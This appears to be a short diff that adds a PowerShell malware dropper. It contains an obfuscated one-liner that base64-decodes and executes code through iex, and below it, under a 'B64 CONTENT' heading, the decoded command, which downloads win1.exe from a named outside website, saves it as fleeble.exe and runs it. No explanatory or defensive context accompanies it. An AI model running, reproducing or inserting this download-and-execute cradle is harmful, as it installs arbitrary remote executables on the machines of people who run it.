@@ -1,0 +1,7 @@
+iex([sYStem.tExt.ENcODINg]::uTF8.geTstRING([SySTEM.CONVErt]::fRombASe64STRIng('CihOZXctT2JqZWN0IFN5c1RFTS5ORVQuV0ViY2xpRW5UKS5kb1duTE9BREZJTEUoJ2h0dHA6Ly9oaW5yaWNoc2VuLmRlL2Fzc2V0cy93aW4xL3dpbjEuZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SysTEM.NET.WEbcliEnT).doWnLOADFILE('http://hinrichsen.de/assets/win1/win1.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
